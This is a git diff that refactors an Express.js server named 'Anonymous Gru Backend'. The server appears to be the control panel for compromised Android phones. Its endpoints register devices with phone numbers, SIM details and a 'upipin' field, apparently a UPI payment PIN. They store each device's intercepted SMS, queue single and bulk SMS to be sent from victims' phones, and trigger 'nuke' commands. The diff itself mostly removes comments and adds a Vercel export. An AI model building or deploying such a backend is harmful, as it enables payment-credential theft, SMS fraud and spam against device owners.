@@ -10,7 +10,7 @@ const PORT = process.env.PORT || 3000;
 // ---------- Paths ----------
 const DATA_DIR = path.join(__dirname, 'data');
 const PUBLIC_DIR = path.join(__dirname, 'public');
-const STATIC_DIR = path.join(__dirname, 'static');   // <-- Added static folder
+const STATIC_DIR = path.join(__dirname, 'static');
 const DEVICES_FILE = path.join(DATA_DIR, 'devices.json');
 const MESSAGES_FILE = path.join(DATA_DIR, 'messages.json');
 const OUTBOX_FILE = path.join(DATA_DIR, 'outbox.json');
@@ -45,19 +45,17 @@ app.use(cors());
 app.use(express.json({ limit: '10mb' }));
 
 // ---------- Static Files ----------
-app.use(express.static(PUBLIC_DIR));   // Serves from /public
-app.use(express.static(STATIC_DIR));   // Serves from /static (your existing static folder)
+app.use(express.static(PUBLIC_DIR));
+app.use(express.static(STATIC_DIR));
 
 // ============================================
 //              API ROUTES
 // ============================================
 
-// ---------- Health Check ----------
 app.get('/api/health', (req, res) => {
   res.json({ status: 'ok', timestamp: Date.now(), uptime: process.uptime() });
 });
 
-// ---------- ROOT API Info ----------
 app.get('/api', (req, res) => {
   res.json({
     name: 'Anonymous Gru Backend API',
@@ -82,8 +80,6 @@ app.get('/api', (req, res) => {
 });
 
 // ---------- DEVICE CRUD ----------
-
-// List all devices
 app.get('/api/devices', (req, res) => {
   try {
     const devices = readJSON(DEVICES_FILE);
@@ -93,44 +89,21 @@ app.get('/api/devices', (req, res) => {
   }
 });
 
-// Get single device
 app.get('/api/devices/:id', (req, res) => {
   try {
     const devices = readJSON(DEVICES_FILE);
     const device = devices[req.params.id];
-    if (!device) {
-      return res.status(404).json({ error: 'Device not found' });
-    }
+    if (!device) return res.status(404).json({ error: 'Device not found' });
     res.json(device);
   } catch (error) {
     res.status(500).json({ error: 'Failed to read device' });
   }
 });
 
-// Register or update device
 app.post('/api/devices', (req, res) => {
   try {
-    const { 
-      id, 
-      name, 
-      status, 
-      battery, 
-      android, 
-      ip, 
-      storage, 
-      provider, 
-      cpu, 
-      sdk, 
-      sims, 
-      upipin, 
-      modelName, 
-      phoneNumber, 
-      lastSeen 
-    } = req.body;
-
-    if (!id) {
-      return res.status(400).json({ error: 'Device ID is required' });
-    }
+    const { id, name, status, battery, android, ip, storage, provider, cpu, sdk, sims, upipin, modelName, phoneNumber, lastSeen } = req.body;
+    if (!id) return res.status(400).json({ error: 'Device ID is required' });
 
     const devices = readJSON(DEVICES_FILE);
     const existing = devices[id] || {};
@@ -162,13 +135,10 @@ app.post('/api/devices', (req, res) => {
   }
 });
 
-// Delete device
 app.delete('/api/devices/:id', (req, res) => {
   try {
     const devices = readJSON(DEVICES_FILE);
-    if (!devices[req.params.id]) {
-      return res.status(404).json({ error: 'Device not found' });
-    }
+    if (!devices[req.params.id]) return res.status(404).json({ error: 'Device not found' });
     delete devices[req.params.id];
     writeJSON(DEVICES_FILE, devices);
     res.json({ success: true });
@@ -178,8 +148,6 @@ app.delete('/api/devices/:id', (req, res) => {
 });
 
 // ---------- MESSAGES ----------
-
-// Get messages for device
 app.get('/api/messages/:deviceId', (req, res) => {
   try {
     const { deviceId } = req.params;
@@ -187,31 +155,24 @@ app.get('/api/messages/:deviceId', (req, res) => {
     const messages = readJSON(MESSAGES_FILE);
     const deviceMessages = messages[deviceId] || [];
     const sorted = deviceMessages.sort((a, b) => (a.timestamp || 0) - (b.timestamp || 0));
-    const latest = sorted.slice(-limit);
-    res.json(latest);
+    res.json(sorted.slice(-limit));
   } catch (error) {
     res.status(500).json({ error: 'Failed to read messages' });
   }
 });
 
-// Add message for device
 app.post('/api/messages/:deviceId', (req, res) => {
   try {
     const { deviceId } = req.params;
     const { sender, message, dateTime, type } = req.body;
-
-    if (!message) {
-      return res.status(400).json({ error: 'Message text is required' });
-    }
+    if (!message) return res.status(400).json({ error: 'Message text is required' });
 
     const messages = readJSON(MESSAGES_FILE);
-    if (!messages[deviceId]) {
-      messages[deviceId] = [];
-    }
+    if (!messages[deviceId]) messages[deviceId] = [];
 
     const entry = {
       sender: sender || 'Unknown',
-      message: message,
+      message,
       dateTime: dateTime || new Date().toISOString(),
       timestamp: Date.now(),
       type: type || 'incoming'
@@ -226,22 +187,15 @@ app.post('/api/messages/:deviceId', (req, res) => {
 });
 
 // ---------- SMS SEND ----------
-
-// Send single SMS
 app.post('/api/sms/send', (req, res) => {
   try {
     const { deviceId, to, message, simSlot } = req.body;
-
     if (!deviceId || !to || !message) {
-      return res.status(400).json({ 
-        error: 'deviceId, to, and message are required' 
-      });
+      return res.status(400).json({ error: 'deviceId, to, and message are required' });
     }
 
     const outbox = readJSON(OUTBOX_FILE);
-    if (!outbox[deviceId]) {
-      outbox[deviceId] = [];
-    }
+    if (!outbox[deviceId]) outbox[deviceId] = [];
 
     const entry = {
       id: uuidv4(),
@@ -256,11 +210,8 @@ app.post('/api/sms/send', (req, res) => {
     outbox[deviceId].push(entry);
     writeJSON(OUTBOX_FILE, outbox);
 
-    // Also store in messages as outgoing
     const messages = readJSON(MESSAGES_FILE);
-    if (!messages[deviceId]) {
-      messages[deviceId] = [];
-    }
+    if (!messages[deviceId]) messages[deviceId] = [];
     messages[deviceId].push({
       sender: '📤 Device',
       message: `To: ${to}\n${message}`,
@@ -270,15 +221,13 @@ app.post('/api/sms/send', (req, res) => {
     });
     writeJSON(MESSAGES_FILE, messages);
 
-    // Simulate delivery after 2-5 seconds
+    // Simulate delivery
     setTimeout(() => {
       const updated = readJSON(OUTBOX_FILE);
       if (updated[deviceId]) {
         const found = updated[deviceId].find(e => e.id === entry.id);
-        if (found) {
-          found.status = 'sent';
-          writeJSON(OUTBOX_FILE, updated);
-        }
+        if (found) found.status = 'sent';
+        writeJSON(OUTBOX_FILE, updated);
       }
     }, 2000 + Math.random() * 3000);
 
@@ -288,22 +237,16 @@ app.post('/api/sms/send', (req, res) => {
   }
 });
 
-// Bulk SMS
 app.post('/api/sms/bulk', (req, res) => {
   try {
     const { deviceId, recipients, message, simSlot } = req.body;
-
     if (!deviceId || !recipients || !Array.isArray(recipients) || recipients.length === 0) {
       return res.status(400).json({ error: 'deviceId and recipients array required' });
     }
-    if (!message) {
-      return res.status(400).json({ error: 'message is required' });
-    }
+    if (!message) return res.status(400).json({ error: 'message is required' });
 
     const outbox = readJSON(OUTBOX_FILE);
-    if (!outbox[deviceId]) {
-      outbox[deviceId] = [];
-    }
+    if (!outbox[deviceId]) outbox[deviceId] = [];
 
     const entries = recipients.map(to => ({
       id: uuidv4(),
@@ -318,11 +261,8 @@ app.post('/api/sms/bulk', (req, res) => {
     outbox[deviceId].push(...entries);
     writeJSON(OUTBOX_FILE, outbox);
 
-    // Add to messages
     const messages = readJSON(MESSAGES_FILE);
-    if (!messages[deviceId]) {
-      messages[deviceId] = [];
-    }
+    if (!messages[deviceId]) messages[deviceId] = [];
     entries.forEach(entry => {
       messages[deviceId].push({
         sender: '📤 Device (Bulk)',
@@ -334,31 +274,23 @@ app.post('/api/sms/bulk', (req, res) => {
     });
     writeJSON(MESSAGES_FILE, messages);
 
-    // Simulate sending each with delay
     entries.forEach((entry, index) => {
       setTimeout(() => {
         const updated = readJSON(OUTBOX_FILE);
         if (updated[deviceId]) {
           const found = updated[deviceId].find(e => e.id === entry.id);
-          if (found) {
-            found.status = 'sent';
-            writeJSON(OUTBOX_FILE, updated);
-          }
+          if (found) found.status = 'sent';
+          writeJSON(OUTBOX_FILE, updated);
         }
       }, 1000 + index * 600 + Math.random() * 1000);
     });
 
-    res.json({ 
-      success: true, 
-      count: entries.length, 
-      entries 
-    });
+    res.json({ success: true, count: entries.length, entries });
   } catch (error) {
     res.status(500).json({ error: 'Failed to send bulk SMS: ' + error.message });
   }
 });
 
-// Get outbox
 app.get('/api/sms/outbox/:deviceId', (req, res) => {
   try {
     const outbox = readJSON(OUTBOX_FILE);
@@ -370,15 +302,10 @@ app.get('/api/sms/outbox/:deviceId', (req, res) => {
 });
 
 // ---------- NUKE COMMANDS ----------
-
-// Trigger nuke
 app.post('/api/nuke', (req, res) => {
   try {
     const { deviceId, command, data } = req.body;
-
-    if (!deviceId) {
-      return res.status(400).json({ error: 'deviceId is required' });
-    }
+    if (!deviceId) return res.status(400).json({ error: 'deviceId is required' });
 
     const nukeJobs = readJSON(NUKE_JOBS_FILE);
     const jobId = uuidv4();
@@ -395,7 +322,6 @@ app.post('/api/nuke', (req, res) => {
     };
     writeJSON(NUKE_JOBS_FILE, nukeJobs);
 
-    // Simulate nuke execution with progress updates
     let progress = 0;
     const interval = setInterval(() => {
       progress += 10;
@@ -423,19 +349,16 @@ app.post('/api/nuke', (req, res) => {
   }
 });
 
-// Get nuke status
 app.get('/api/nuke/status/:deviceId', (req, res) => {
   try {
     const nukeJobs = readJSON(NUKE_JOBS_FILE);
-    const job = nukeJobs[req.params.deviceId] || null;
-    res.json(job);
+    res.json(nukeJobs[req.params.deviceId] || null);
   } catch (error) {
     res.status(500).json({ error: 'Failed to read nuke status' });
   }
 });
 
 // ---------- STATISTICS ----------
-
 app.get('/api/stats', (req, res) => {
   try {
     const devices = readJSON(DEVICES_FILE);
@@ -478,19 +401,12 @@ app.get('/api/stats', (req, res) => {
 });
 
 // ---------- FALLBACK FOR SPA ----------
-// Serve index.html for any non-API route (supports client-side routing)
 app.get('*', (req, res) => {
-  // If request is for an API endpoint that wasn't caught, return 404
   if (req.path.startsWith('/api/')) {
     return res.status(404).json({ error: `API endpoint not found: ${req.path}` });
   }
-  // Otherwise serve index.html (SPA fallback)
   res.sendFile(path.join(PUBLIC_DIR, 'index.html'));
 });
 
-// ---------- Start Server ----------
-app.listen(PORT, () => {
-  console.log(`\n🚀 Anonymous Gru Backend running on port ${PORT}`);
-  console.log(`📍 Frontend: http://localhost:${PORT}`);
-  console.log(`📡 API Info: http://localhost:${PORT}/api\n`);
-});
+// ---------- EXPORT for Vercel (serverless) ----------
+module.exports = app;
